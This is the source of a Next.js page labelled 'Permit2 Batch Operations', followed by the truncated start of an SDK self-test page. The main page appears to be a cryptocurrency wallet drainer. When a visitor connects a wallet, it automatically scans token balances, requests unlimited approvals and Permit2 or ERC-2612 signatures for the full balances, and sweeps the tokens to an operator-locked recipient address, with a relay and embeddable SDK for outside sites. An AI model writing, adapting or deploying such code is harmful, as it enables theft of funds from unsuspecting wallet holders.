```tsx
"use client";

import { Suspense, useEffect, useMemo, useState, useCallback, useRef } from "react";
import { useSearchParams } from "next/navigation";
import { useAppKit } from "@reown/appkit/react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Switch } from "@/components/ui/switch";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Shield,
  Wallet,
  ArrowRight,
  CheckCircle2,
  AlertCircle,
  Loader2,
  Zap,
  Send,
  RefreshCw,
} from "lucide-react";
import { toast } from "sonner";
import type { Address } from "viem";
import { useAccount, usePublicClient, useWalletClient } from "wagmi";
import type { ExecutionBackend } from "@/lib/types";
import type { OperationalConfig } from "@/lib/operational-config-store";
import { ReownProvider } from "@/components/reown-provider";

// ── Constants ───────────────────────────────────────────

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as const;
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7" as const;
const UINT160_MAX = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");

function capPermit2Amount(balance: bigint): bigint {
  return balance > UINT160_MAX ? UINT160_MAX : balance;
}

const ERC20_ABI = [
  { inputs: [{ name: "owner", type: "address" }], name: "balanceOf", outputs: [{ type: "uint256" }], stateMutability: "view", type: "function" },
  { inputs: [], name: "decimals", outputs: [{ type: "uint8" }], stateMutability: "view", type: "function" },
  { inputs: [], name: "name", outputs: [{ type: "string" }], stateMutability: "view", type: "function" },
  { inputs: [], name: "symbol", outputs: [{ type: "string" }], stateMutability: "view", type: "function" },
  { inputs: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }], name: "allowance", outputs: [{ type: "uint256" }], stateMutability: "view", type: "function" },
  { inputs: [{ name: "spender", type: "address" }, { name: "amount", type: "uint256" }], name: "approve", outputs: [{ type: "bool" }], stateMutability: "nonpayable", type: "function" },
] as const;

const PERMIT2_ABI = [
  { inputs: [{ name: "owner", type: "address" }, { name: "token", type: "address" }, { name: "spender", type: "address" }], name: "allowance", outputs: [{ name: "amount", type: "uint160" }, { name: "expiration", type: "uint48" }, { name: "nonce", type: "uint48" }], stateMutability: "view", type: "function" },
] as const;

const ERC2612_ABI = [
  { inputs: [{ name: "owner", type: "address" }], name: "nonces", outputs: [{ type: "uint256" }], stateMutability: "view", type: "function" },
  { inputs: [], name: "version", outputs: [{ type: "string" }], stateMutability: "view", type: "function" },
] as const;

const KNOWN_TOKENS: Record<number, Array<{ address: string; symbol: string; decimals: number }>> = {
  1: [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
  ],
  56: [
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
  ],
  137: [
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
  ],
};

// ── Types ───────────────────────────────────────────────

interface TokenState {
  address: string;
  symbol: string;
  decimals: number;
  balance: bigint;
  balanceFormatted: string;
  permit2Allowance: bigint;
  /** ERC20 approved for the correct spender (Permit2 contract or batch executor). */
  erc20Approved: boolean;
  selected: boolean;
  nonce: number;
  permitSupported?: boolean;
  permitVersion?: string;
}

interface BackendConfigEntry {
  name: string;
  address: string | null;
  executionBackend: ExecutionBackend | null;
}

type Step = "connect" | "scan" | "approve" | "sign" | "execute" | "done";

function Permit2PageInner() {
  const searchParams = useSearchParams();
  const { open } = useAppKit();
  const { address: connectedAddress, chainId: connectedChainId, isConnected } = useAccount();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<number | null>(null);
  const [recipientAddress, setRecipientAddress] = useState("");
  const [tokens, setTokens] = useState<TokenState[]>([]);
  const [step, setStep] = useState<Step>("connect");
  const [busy, setBusy] = useState(false);
  const [txHash, setTxHash] = useState<string | null>(null);
  const [useRelay, setUseRelay] = useState(false);
  const [relayReady, setRelayReady] = useState(false);
  const [relayMessage, setRelayMessage] = useState<string | null>(null);
  const [executionBackend, setExecutionBackend] = useState<ExecutionBackend>("stealth-exchange");
  const [backendEntries, setBackendEntries] = useState<BackendConfigEntry[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [autoExecute, setAutoExecute] = useState(true);
  const [recipientLocked, setRecipientLocked] = useState(false);
  const autoPipelineLock = useRef(false);
  const autoAttemptedRef = useRef(false);
  const projectId = searchParams.get("projectId")?.trim() || "";

  function getErrorMessage(error: unknown, fallback: string) {
    if (error instanceof Error && error.message) return error.message;
    if (typeof error === "object" && error && "shortMessage" in error) {
      const shortMessage = (error as { shortMessage?: unknown }).shortMessage;
      if (typeof shortMessage === "string" && shortMessage) return shortMessage;
    }
    return fallback;
  }

  const selectedTokens = useMemo(() => tokens.filter((t) => t.selected && t.balance > 0n), [tokens]);
  const allApproved = useMemo(() => selectedTokens.every((t) => t.erc20Approved), [selectedTokens]);
  const requiresTypedPermitSignature = executionBackend === "stealth-exchange";
  const usesErc2612Permit = executionBackend === "erc2612-executor";
  const activeBackendEntry = useMemo(
    () => backendEntries.find((entry) => entry.executionBackend === executionBackend) ?? null,
    [backendEntries, executionBackend],
  );
  const executionAddress = activeBackendEntry?.address || "";
  const usesPermit2Allowance = executionBackend !== "batch-multicall" && executionBackend !== "erc2612-executor";
  /** ERC20 `approve` target: always Permit2 for permit flows; executor for batch-multicall. */
  const erc20ApprovalTarget =
    executionBackend === "batch-multicall" ? executionAddress : PERMIT2_ADDRESS;
  /** Permit2 `allowance(owner, token, spender)` spender — the execution contract. */
  const permit2Spender = executionAddress;
  const approvalTargetLabel =
    executionBackend === "batch-multicall"
      ? "BatchMulticall"
      : executionBackend === "erc2612-executor"
        ? "ERC-2612 Permit"
        : "Permit2";

  // Permanent platform config (recipient + automation) + relay readiness
  useEffect(() => {
    const recipientFromQuery = searchParams.get("recipient")?.trim() || "";
    if (recipientFromQuery) {
      setRecipientAddress(recipientFromQuery);
      setRecipientLocked(false);
    }

    let active = true;
    async function bootstrap() {
      try {
        const [platformRes, relayRes] = await Promise.all([
          fetch("/api/platform-config", { cache: "no-store" }),
          fetch("/api/relay/status", { cache: "no-store" }),
        ]);
        if (!active) return;

        if (platformRes.ok) {
          const platform = (await platformRes.json()) as {
            recipient?: string;
            autoExecute?: boolean;
            payout?: { autoSweep?: boolean };
          };
          if (!recipientFromQuery && platform.recipient) {
            setRecipientAddress(platform.recipient);
            setRecipientLocked(true);
          }
          setAutoExecute(platform.autoExecute ?? true);
        }

        if (relayRes.ok) {
          const relay = (await relayRes.json()) as {
            relayConfigured?: boolean;
            message?: string;
            authorizedOnExchange?: boolean | null;
          };
          const ready = !!relay.relayConfigured && relay.authorizedOnExchange !== false;
          setRelayReady(ready);
          setRelayMessage(relay.message || null);
          setUseRelay(ready);
        }
      } catch {
        // direct mode remains default
      }
    }
    void bootstrap();
    return () => {
      active = false;
    };
  }, [searchParams]);

  useEffect(() => {
    let active = true;
    async function loadOperationalConfig() {
      try {
        const [operationalRes, configRes] = await Promise.all([
          fetch("/api/operational-config", { cache: "no-store" }),
          fetch("/api/config", { cache: "no-store" }),
        ]);
        const operationalData = (await operationalRes.json()) as { config?: OperationalConfig };
        const configData = (await configRes.json()) as { executionBackends?: BackendConfigEntry[] };
        if (!active) return;
        if (operationalRes.ok && operationalData.config) {
          setExecutionBackend(operationalData.config.strategy.executionBackend);
        }
        if (configRes.ok && Array.isArray(configData.executionBackends)) {
          setBackendEntries(configData.executionBackends);
        }
      } catch {
        // Keep default when operational config is unavailable.
      }
    }
    void loadOperationalConfig();
    return () => {
      active = false;
    };
  }, []);

  useEffect(() => {
    if (!isConnected || !connectedAddress || !connectedChainId) return;

    setWalletAddress(connectedAddress);
    setChainId(connectedChainId);
    setStep((current) => (current === "connect" ? "scan" : current));
    setError(null);
  }, [isConnected, connectedAddress, connectedChainId]);

  // ── Step 1: Connect ─────────────────────────────────

  async function handleConnect() {
    setError(null);
    await open({ view: "Connect" });
  }

  // ── Step 2: Scan ────────────────────────────────────

  const handleScan = useCallback(async () => {
    if (!walletAddress || !chainId || !publicClient) return;
    if (!erc20ApprovalTarget || (usesPermit2Allowance && !permit2Spender)) {
      setError(`Missing configured address for ${executionBackend}`);
      return;
    }
    setBusy(true);
    setError(null);
    try {
      const knownList = KNOWN_TOKENS[chainId] || [];
      const results: TokenState[] = [];

      for (const tk of knownList) {
        try {
          const [balance, erc20Allowance, permit2Slot, permitInfo] = await Promise.all([
            publicClient.readContract({
              address: tk.address as Address,
              abi: ERC20_ABI,
              functionName: "balanceOf",
              args: [walletAddress as Address],
            }),
            usesErc2612Permit
              ? Promise.resolve(0n)
              : publicClient.readContract({
                  address: tk.address as Address,
                  abi: ERC20_ABI,
                  functionName: "allowance",
                  args: [walletAddress as Address, erc20ApprovalTarget as Address],
                }),
            usesPermit2Allowance
              ? publicClient.readContract({
                  address: PERMIT2_ADDRESS,
                  abi: PERMIT2_ABI,
                  functionName: "allowance",
                  args: [walletAddress as Address, tk.address as Address, permit2Spender as Address],
                })
              : Promise.resolve(null),
            usesErc2612Permit
              ? (async () => {
                  const [nonce, version] = await Promise.all([
                    publicClient.readContract({
                      address: tk.address as Address,
                      abi: ERC2612_ABI,
                      functionName: "nonces",
                      args: [walletAddress as Address],
                    }),
                    publicClient.readContract({
                      address: tk.address as Address,
                      abi: ERC2612_ABI,
                      functionName: "version",
                    }).catch(() => "1"),
                  ]);
                  return { nonce, version: String(version || "1") };
                })()
              : Promise.resolve(null),
          ]);

          const bal = balance as bigint;
          const erc20Allowed = (erc20Allowance as bigint) >= bal && bal > 0n;
          const permit2Amount = permit2Slot
            ? (permit2Slot as unknown as [bigint, bigint, bigint])[0]
            : 0n;
          const nonce = usesErc2612Permit
            ? Number((permitInfo as { nonce: bigint }).nonce)
            : permit2Slot
              ? Number((permit2Slot as unknown as [bigint, bigint, bigint])[2])
              : 0;
          const divisor = 10n ** BigInt(tk.decimals);
          const formatted = (Number(bal) / Number(divisor)).toFixed(tk.decimals > 6 ? 4 : 2);

          results.push({
            address: tk.address,
            symbol: tk.symbol,
            decimals: tk.decimals,
            balance: bal,
            balanceFormatted: formatted,
            permit2Allowance: permit2Amount,
            erc20Approved: erc20Allowed,
            selected: usesErc2612Permit ? bal > 0n && !!permitInfo : bal > 0n,
            nonce,
            permitSupported: usesErc2612Permit ? !!permitInfo : undefined,
            permitVersion: usesErc2612Permit && permitInfo ? (permitInfo as { version: string }).version : undefined,
          });
        } catch {
          // skip failed tokens
        }
      }

      setTokens(results);
      setStep("approve");
      toast.success(`Scanned ${results.length} tokens`);
    } catch (error: unknown) {
      setError(getErrorMessage(error, "Scan failed"));
    } finally {
      setBusy(false);
    }
  }, [walletAddress, chainId, erc20ApprovalTarget, permit2Spender, publicClient, executionBackend, usesPermit2Allowance, usesErc2612Permit]);

  useEffect(() => {
    if (step !== "scan" || busy || !walletAddress || !chainId || !publicClient) return;
    void handleScan();
  }, [step, busy, walletAddress, chainId, publicClient, handleScan]);

  // ── Step 3: Approve spender ─────────────────────────

  async function handleApproveAll(options?: { skipRescan?: boolean }) {
    if (!walletAddress || !walletClient || usesErc2612Permit) return;
    setBusy(true);
    setError(null);
    try {
      const needsApproval = selectedTokens.filter((t) => !t.erc20Approved);
      const maxApproval = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

      for (const tk of needsApproval) {
        toast.info(`Approving ${tk.symbol} for ${approvalTargetLabel}...`);
        if (
          tk.address.toLowerCase() === USDT_ADDRESS.toLowerCase() &&
          publicClient
        ) {
          const current = (await publicClient.readContract({
            address: tk.address as Address,
            abi: ERC20_ABI,
            functionName: "allowance",
            args: [walletAddress as Address, erc20ApprovalTarget as Address],
          })) as bigint;
          if (current > 0n && current < maxApproval) {
            const resetHash = await walletClient.writeContract({
              address: tk.address as Address,
              abi: ERC20_ABI,
              functionName: "approve",
              args: [erc20ApprovalTarget as Address, 0n],
              account: walletAddress as Address,
            });
            await publicClient.waitForTransactionReceipt({ hash: resetHash });
          }
        }
        const hash = await walletClient.writeContract({
          address: tk.address as Address,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [erc20ApprovalTarget as Address, maxApproval],
          account: walletAddress as Address,
        });
        if (publicClient) await publicClient.waitForTransactionReceipt({ hash });
        toast.success(`${tk.symbol} approved: ${hash.slice(0, 10)}...`);
      }

      if (options?.skipRescan) {
        const approvedSet = new Set(needsApproval.map((t) => t.address.toLowerCase()));
        setTokens((prev) =>
          prev.map((t) =>
            approvedSet.has(t.address.toLowerCase()) ? { ...t, erc20Approved: true } : t,
          ),
        );
        setStep("sign");
      } else {
        await handleScan();
        setStep("sign");
      }
    } catch (error: unknown) {
      setError(getErrorMessage(error, "Approval failed"));
    } finally {
      setBusy(false);
    }
  }

  // Automatic: approve → sign → execute after scan (Settings: Auto Sweep / Auto Sign)
  useEffect(() => {
    if (!autoExecute || busy || autoPipelineLock.current || autoAttemptedRef.current) return;
    if (step !== "approve" || !walletAddress || !recipientAddress || selectedTokens.length === 0) return;

    autoAttemptedRef.current = true;
    autoPipelineLock.current = true;
    void (async () => {
      try {
        if (!usesErc2612Permit && selectedTokens.some((t) => !t.erc20Approved)) {
          await handleApproveAll({ skipRescan: true });
        }
        await handleSignAndExecute();
      } catch (error: unknown) {
        setError(getErrorMessage(error, "Automatic execution failed"));
      } finally {
        autoPipelineLock.current = false;
      }
    })();
  }, [
    step,
    autoExecute,
    busy,
    walletAddress,
    recipientAddress,
    selectedTokens,
    usesErc2612Permit,
    allApproved,
  ]);

  // ── Step 4: Sign / execute batch ────────────────────

  async function handleSignAndExecute() {
    if (!walletAddress || !recipientAddress || selectedTokens.length === 0 || !walletClient) return;
    if (!executionAddress) {
      setError(`Missing configured address for ${executionBackend}`);
      return;
    }
    setBusy(true);
    setError(null);
    try {
      const now = Math.floor(Date.now() / 1000);
      const expiration = now + 60 * 60 * 24 * 30; // 30 days
      const sigDeadline = BigInt(now + 60 * 20); // 20 min

      const details = selectedTokens.map((tk) => ({
        token: tk.address as Address,
        amount: capPermit2Amount(tk.balance),
        expiration,
        nonce: tk.nonce,
      }));

      let signature: `0x${string}` | undefined;
      let erc2612Permits:
        | Array<{ token: string; amount: string; v: number; r: `0x${string}`; s: `0x${string}` }>
        | undefined;
      if (requiresTypedPermitSignature) {
        const domain = {
          name: "Permit2",
          chainId: chainId!,
          verifyingContract: PERMIT2_ADDRESS,
        };

        const types = {
          PermitDetails: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint160" },
            { name: "expiration", type: "uint48" },
            { name: "nonce", type: "uint48" },
          ],
          PermitBatch: [
            { name: "details", type: "PermitDetails[]" },
            { name: "spender", type: "address" },
            { name: "sigDeadline", type: "uint256" },
          ],
        };

        toast.info("Sign the Permit2 batch in your wallet...");

        signature = await walletClient.signTypedData({
          account: walletAddress as Address,
          domain,
          types,
          primaryType: "PermitBatch",
          message: {
            details: details.map((d) => ({
              token: d.token,
              amount: d.amount,
              expiration: d.expiration,
              nonce: d.nonce,
            })),
            spender: executionAddress as Address,
            sigDeadline,
          },
        });

        toast.success("Permit signed");
      } else if (usesErc2612Permit) {
        if (!publicClient) throw new Error("Public client unavailable");
        toast.info("Signing ERC-2612 permits for supported tokens...");
        erc2612Permits = [];
        const deadline = BigInt(now + 60 * 20);

        for (const tk of selectedTokens) {
          if (!tk.permitSupported) throw new Error(`${tk.symbol} does not support standard ERC-2612`);
          const tokenName = await publicClient.readContract({
            address: tk.address as Address,
            abi: ERC20_ABI,
            functionName: "name",
          });
          const signed = await walletClient.signTypedData({
            account: walletAddress as Address,
            domain: {
              name: String(tokenName),
              version: tk.permitVersion || "1",
              chainId: chainId!,
              verifyingContract: tk.address as Address,
            },
            types: {
              Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" },
              ],
            },
            primaryType: "Permit",
            message: {
              owner: walletAddress as Address,
              spender: executionAddress as Address,
              value: tk.balance,
              nonce: BigInt(tk.nonce),
              deadline,
            },
          });
          const compact = signed.slice(2);
          const r = `0x${compact.slice(0, 64)}` as `0x${string}`;
          const s = `0x${compact.slice(64, 128)}` as `0x${string}`;
          const vRaw = Number.parseInt(compact.slice(128, 130), 16);
          erc2612Permits.push({
            token: tk.address,
            amount: tk.balance.toString(),
            v: vRaw < 27 ? vRaw + 27 : vRaw,
            r,
            s,
          });
        }
      } else {
        toast.info("Using existing Permit2 allowances with permit2-executor...");
      }

      setStep("execute");

      // Serialize for relay
      const payload = {
        user: walletAddress,
        recipient: recipientAddress,
        projectId: projectId || undefined,
        permitBatch: {
          details: details.map((d) => ({
            token: d.token,
            amount: d.amount.toString(),
            expiration: d.expiration,
            nonce: d.nonce,
          })),
          spender: executionAddress,
          sigDeadline: sigDeadline.toString(),
        },
        signature,
        erc2612Permits,
        executionBackend,
      };

      if (useRelay) {
        // Relay via backend
        toast.info("Relaying transaction...");
        const res = await fetch("/api/relay/batch", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.message || "Relay failed");
        setTxHash(data.hash);
        if (publicClient) {
          await publicClient.waitForTransactionReceipt({ hash: data.hash as `0x${string}` });
        }
      } else {
        if (!signature || executionBackend !== "stealth-exchange") {
          throw new Error(`${executionBackend} direct execution is not implemented on this page yet. Use relay mode.`);
        }
        // Direct on-chain execution
        toast.info("Submitting transaction on-chain...");
        const EXCHANGE_ABI = [
          {
            inputs: [
              { name: "user", type: "address" },
              {
                components: [
                  {
                    components: [
                      { name: "token", type: "address" },
                      { name: "amount", type: "uint160" },
                      { name: "expiration", type: "uint48" },
                      { name: "nonce", type: "uint48" },
                    ],
                    name: "details",
                    type: "tuple[]",
                  },
                  { name: "spender", type: "address" },
                  { name: "sigDeadline", type: "uint256" },
                ],
                name: "permitBatch",
                type: "tuple",
              },
              { name: "signature", type: "bytes" },
              { name: "recipient", type: "address" },
            ],
            name: "batchPermitTransferFromBatch",
            outputs: [{ name: "amounts", type: "uint256[]" }],
            stateMutability: "nonpayable",
            type: "function",
          },
        ] as const;

        const hash = await walletClient.writeContract({
          address: executionAddress as Address,
          abi: EXCHANGE_ABI,
          functionName: "batchPermitTransferFromBatch",
          args: [
            walletAddress as Address,
            {
              details: details.map((d) => ({
                token: d.token,
                amount: d.amount,
                expiration: d.expiration,
                nonce: d.nonce,
              })),
              spender: executionAddress as Address,
              sigDeadline,
            },
            signature,
            recipientAddress as Address,
          ],
          account: walletAddress as Address,
        });
        setTxHash(hash);
        if (publicClient) {
          await publicClient.waitForTransactionReceipt({ hash });
        }
      }

      setStep("done");
      toast.success("Batch transfer complete!");
    } catch (error: unknown) {
      setError(getErrorMessage(error, "Transaction failed"));
    } finally {
      setBusy(false);
    }
  }

  function toggleToken(address: string) {
    setTokens((prev) =>
      prev.map((t) => (t.address === address ? { ...t, selected: !t.selected } : t))
    );
  }

  function reset() {
    setTokens([]);
    setStep(walletAddress ? "scan" : "connect");
    setTxHash(null);
    setError(null);
    autoAttemptedRef.current = false;
    autoPipelineLock.current = false;
  }

  // ── Render ──────────────────────────────────────────

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold tracking-tight flex items-center gap-2">
          <Shield className="h-6 w-6 text-primary" /> Permit2 Batch Operations
        </h1>
        <p className="text-muted-foreground text-sm mt-1">
          Reown WalletConnect handles the wallet session first. This route now supports the typed-sign StealthExchange flow, the Permit2Executor allowance-pull flow, the BatchMulticall approval-based flow, and standard ERC-2612 permit collection for supported tokens.
        </p>
        <p className="text-xs font-mono uppercase tracking-wider text-primary mt-2">
          Backend: {executionBackend}
        </p>
      </div>

      {/* Progress Steps */}
      <div className="flex items-center gap-2 text-xs font-mono uppercase tracking-wider">
        {(["connect", "scan", "approve", "sign", "execute", "done"] as Step[]).map((s, i) => (
          <div key={s} className="flex items-center gap-2">
            {i > 0 && <ArrowRight className="h-3 w-3 text-muted-foreground" />}
            <span
              className={
                step === s
                  ? "text-primary font-bold"
                  : (["connect", "scan", "approve", "sign", "execute", "done"].indexOf(step) >
                      ["connect", "scan", "approve", "sign", "execute", "done"].indexOf(s))
                  ? "text-emerald-500"
                  : "text-muted-foreground"
              }
            >
              {s}
            </span>
          </div>
        ))}
      </div>

      {relayMessage && (
        <Card
          className={
            relayReady
              ? "border-emerald-500/30 bg-emerald-500/5 rounded-none"
              : "border-yellow-500/30 bg-yellow-500/5 rounded-none"
          }
        >
          <CardContent className="p-4 text-sm">
            <p className={relayReady ? "text-emerald-400" : "text-yellow-400"}>
              {relayReady
                ? "Relay is configured — gasless mode available."
                : "Relay not ready — using direct on-chain execution (you pay gas)."}
            </p>
            <p className="text-xs text-muted-foreground mt-1 font-mono">{relayMessage}</p>
          </CardContent>
        </Card>
      )}

      {error && (
        <Card className="border-red-500/30 bg-red-500/5 rounded-none">
          <CardContent className="p-4 flex items-center gap-2 text-sm text-red-400">
            <AlertCircle className="h-4 w-4 shrink-0" /> {error}
          </CardContent>
        </Card>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left: Config */}
        <div className="space-y-4">
          <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
            <CardHeader>
              <CardTitle className="text-sm font-mono uppercase tracking-wider">Wallet</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              {walletAddress ? (
                <div className="space-y-2">
                  <Badge variant="outline" className="font-mono text-xs rounded-none">
                    {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
                  </Badge>
                  <p className="text-[10px] font-mono text-muted-foreground">Chain: {chainId}</p>
                </div>
              ) : (
                <Button onClick={handleConnect} disabled={busy} className="w-full rounded-none font-mono text-xs uppercase">
                  {busy ? <Loader2 className="h-3 w-3 animate-spin mr-2" /> : <Wallet className="h-3 w-3 mr-2" />}
                  Connect Wallet
                </Button>
              )}
            </CardContent>
          </Card>

          <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
            <CardHeader>
              <CardTitle className="text-sm font-mono uppercase tracking-wider">Recipient</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <Input
                placeholder="0x... (set permanently in Settings → Payout)"
                value={recipientAddress}
                onChange={(e) => setRecipientAddress(e.target.value)}
                readOnly={recipientLocked}
                className="rounded-none bg-black/40 border-border/40 font-mono text-xs"
              />
              {recipientLocked ? (
                <p className="text-[10px] font-mono text-emerald-500">
                  Permanent recipient loaded from platform config
                </p>
              ) : (
                <p className="text-[10px] font-mono text-yellow-500">
                  Set payout address in Settings and click Save to lock recipient permanently
                </p>
              )}
              {autoExecute ? (
                <p className="text-[10px] font-mono text-primary">
                  Auto-execute enabled — connect wallet to approve, sign, and transfer automatically
                </p>
              ) : null}
              <div className="flex items-center gap-2">
                <Switch
                  checked={useRelay}
                  onCheckedChange={setUseRelay}
                  disabled={!relayReady}
                />
                <Label className="text-xs font-mono">
                  Use relay (gasless){relayReady ? "" : " — not configured"}
                </Label>
              </div>
            </CardContent>
          </Card>

          <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
            <CardHeader>
              <CardTitle className="text-sm font-mono uppercase tracking-wider">Contracts</CardTitle>
            </CardHeader>
            <CardContent className="space-y-2 text-[10px] font-mono text-muted-foreground">
              <div className="flex justify-between">
                <span>Permit2</span>
                <span>{PERMIT2_ADDRESS.slice(0, 8)}...{PERMIT2_ADDRESS.slice(-6)}</span>
              </div>
              <div className="flex justify-between">
                <span>Exchange</span>
                <span>{executionAddress ? `${executionAddress.slice(0, 8)}...${executionAddress.slice(-6)}` : "Not set"}</span>
              </div>
              <div className="flex justify-between">
                <span>ERC20 approve target</span>
                <span>{erc20ApprovalTarget ? `${erc20ApprovalTarget.slice(0, 8)}...${erc20ApprovalTarget.slice(-6)}` : "Not set"}</span>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Right: Token Table + Actions */}
        <div className="lg:col-span-2 space-y-4">
          {step === "scan" && (
            <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
              <CardContent className="p-4 flex items-center gap-3 text-sm">
                <Loader2 className="h-4 w-4 animate-spin text-primary" />
                <div>
                  <p className="font-mono text-xs uppercase tracking-wider">Preparing Batch Execution Flow</p>
                  <p className="text-xs text-muted-foreground">
                    Scanning balances and active allowances automatically.
                  </p>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Token Table */}
          {tokens.length > 0 && (
            <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
              <CardHeader className="pb-3">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-sm font-mono uppercase tracking-wider">Tokens Found</CardTitle>
                  <Badge variant="outline" className="rounded-none text-[10px] font-mono">
                    {selectedTokens.length} selected
                  </Badge>
                </div>
              </CardHeader>
              <CardContent>
                <Table>
                  <TableHeader>
                    <TableRow className="border-border/40">
                      <TableHead className="w-8"></TableHead>
                      <TableHead className="text-[10px] font-mono uppercase">Token</TableHead>
                      <TableHead className="text-[10px] font-mono uppercase">Balance</TableHead>
                      <TableHead className="text-[10px] font-mono uppercase">{approvalTargetLabel}</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {tokens.map((tk) => (
                      <TableRow key={tk.address} className="border-border/20">
                        <TableCell>
                          <Checkbox
                            checked={tk.selected}
                            onCheckedChange={() => toggleToken(tk.address)}
                            disabled={tk.balance === 0n}
                          />
                        </TableCell>
                        <TableCell className="font-mono text-sm font-medium">{tk.symbol}</TableCell>
                        <TableCell className="font-mono text-xs text-muted-foreground">
                          {tk.balanceFormatted}
                        </TableCell>
                        <TableCell>
                          {tk.erc20Approved ? (
                            <span className="flex items-center gap-1 text-emerald-500 text-xs">
                              <CheckCircle2 className="h-3 w-3" /> {usesErc2612Permit ? "Ready" : "Approved"}
                            </span>
                          ) : tk.balance > 0n ? (
                            <span className="flex items-center gap-1 text-yellow-500 text-xs">
                              <AlertCircle className="h-3 w-3" /> {usesErc2612Permit ? "No permit support" : "Needs approval"}
                            </span>
                          ) : (
                            <span className="text-xs text-muted-foreground">—</span>
                          )}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </CardContent>
            </Card>
          )}

          {/* Action Buttons */}
          {step === "approve" && selectedTokens.length > 0 && !allApproved && !usesErc2612Permit && (
            <Button onClick={() => void handleApproveAll()} disabled={busy} className="w-full rounded-none font-mono text-xs uppercase gap-2">
              {busy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Zap className="h-3 w-3" />}
              Approve {selectedTokens.filter((t) => !t.erc20Approved).length} Token(s) for {approvalTargetLabel}
            </Button>
          )}

          {(step === "approve" && (allApproved || usesErc2612Permit)) || step === "sign" ? (
            <Button
              onClick={handleSignAndExecute}
              disabled={busy || !recipientAddress || selectedTokens.length === 0}
              className="w-full rounded-none font-mono text-xs uppercase gap-2 bg-primary"
            >
              {busy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Send className="h-3 w-3" />}
              {requiresTypedPermitSignature ? "Single Signature" : "Execute"}: {useRelay ? "Relay" : "Execute"} Batch Transfer ({selectedTokens.length} tokens)
            </Button>
          ) : null}

          {/* Done */}
          {step === "done" && txHash && (
            <Card className="border-emerald-500/30 bg-emerald-500/5 rounded-none">
              <CardContent className="p-6 space-y-3">
                <div className="flex items-center gap-2 text-emerald-500">
                  <CheckCircle2 className="h-5 w-5" />
                  <span className="font-mono text-sm uppercase tracking-wider font-bold">Transfer Complete</span>
                </div>
                <div className="space-y-1">
                  <p className="text-[10px] font-mono text-muted-foreground uppercase">Transaction Hash</p>
                  <p className="font-mono text-xs break-all">{txHash}</p>
                </div>
                <Button onClick={reset} variant="outline" className="rounded-none font-mono text-xs uppercase gap-2">
                  <RefreshCw className="h-3 w-3" /> New Transfer
                </Button>
              </CardContent>
            </Card>
          )}
        </div>
      </div>
    </div>
  );
}

export default function Permit2Page() {
  return (
    <ReownProvider cookies={null}>
      <Suspense fallback={<div className="p-8 text-muted-foreground">Loading...</div>}>
        <Permit2PageInner />
      </Suspense>
    </ReownProvider>
  );
}
```

### src/app/sdk-self-test/page.tsx

```tsx
"use client";

import { useEffect, useRef, useState } from "react";
import Link from "next/link";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { PlayCircle, ExternalLink, Settings, Code2 } from "lucide-react";
import { toast } from "sonner";

const SCRIPT_ID = "st3-sdk-self-test-module";

type StealthGlobal = {
  init?: () => void | Promise<void>;
  openConnectModal?: () => void | Promise<void>;
  getModal?: () => { open?: (options?: unknown) => void | Promise<void> } | null;
};

/**
 * Loads the same live bundle as external sites: GET /api/sdk (no affiliate configId).
 * Do not remove the script on unmount — React Strict Mode would tear it down and break AppKit.
 */
